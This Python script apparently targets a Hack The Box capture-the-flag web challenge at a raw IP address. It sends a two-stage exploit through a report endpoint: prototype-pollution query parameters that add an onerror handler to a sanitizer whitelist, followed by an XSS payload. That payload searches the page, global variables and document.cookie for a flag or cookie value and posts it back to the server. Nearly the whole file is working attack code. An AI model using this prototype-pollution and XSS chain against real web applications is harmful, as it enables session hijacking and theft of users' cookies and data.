import requests
import urllib.parse
import time

base_url = "http://94.237.51.6:30154"

# One final coordinated attempt
# I'll send multiple stages of payloads

# Stage 1: Pollute + set up a "receiver" variable
pollution1 = "__proto__[flagReceiver]=1"
xss1 = "search=test"
id1 = f"3?{pollution1}&{xss1}"

# Stage 2: Send the actual XSS that checks for flag in various places
pollution2 = "__proto__[whiteList][img][]=onerror"
xss2 = urllib.parse.quote("""<img src=x onerror='
var flag="NONE";
// Try multiple sources
if(typeof window.FLAG !== "undefined") flag = window.FLAG;
else if(document.body.innerHTML.includes("HTB{")) flag = document.body.innerHTML.match(/HTB{[^}]+}/)[0];
else if(document.cookie) flag = document.cookie;
// Report the flag
fetch("/api/report", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({id:"RESULT:"+flag})});
'>""")
id2 = f"3?{pollution2}&search={xss2}"

print("Sending final coordinated attack...")
for i, payload_id in enumerate([id1, id2], 1):
    print(f"\nStage {i}:")
    r = requests.post(f"{base_url}/api/report",
                     json={"id": payload_id},
                     headers={"Content-Type": "application/json"},
                     timeout=5)
    print(f"  Response: {r.text}")
    time.sleep(2)

print("\n✓ All stages sent. Waiting...")
time.sleep(10)

